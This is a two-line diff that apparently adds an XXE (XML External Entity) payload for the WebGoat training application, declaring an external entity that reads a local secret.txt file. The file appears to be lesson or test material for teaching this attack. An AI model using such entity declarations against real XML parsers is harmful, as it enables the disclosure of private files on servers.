@@ -1,0 +1,2 @@
+<?xml version="1.0"?>
+<!ENTITY file SYSTEM "file:///home/webgoat/.webgoat-2023.9-SNAPSHOT//XXE/location/secret.txt">
